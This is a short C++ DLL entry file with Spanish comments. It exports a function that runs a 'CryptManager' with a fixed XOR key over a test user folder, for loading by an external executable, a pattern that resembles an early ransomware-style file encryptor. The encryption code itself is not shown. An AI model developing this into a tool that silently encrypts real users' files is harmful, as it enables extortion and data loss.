// dllmain.cpp : Define el punto de entrada de la aplicación DLL.
#include "pch.h"
#include <windows.h>
#include "CryptManager.h"

// Esta función será llamada externamente (por ejemplo, desde un ejecutable que use LoadLibrary + GetProcAddress)
extern "C" __declspec(dllexport) void ExecuteCrypt() {
    CryptManager cryptManager(0xDE); // Clave XOR fija
    cryptManager.start(L"C:\\Users\\cain\\testing"); // Ruta de prueba, puedes hacerla parametrizable
}

// DllMain solo gestiona los eventos de carga sin hacer lógica
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // No ejecutes CreateThread aquí — loader lock podría causar problemas
        DisableThreadLibraryCalls(hModule); // Optimización opcional
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
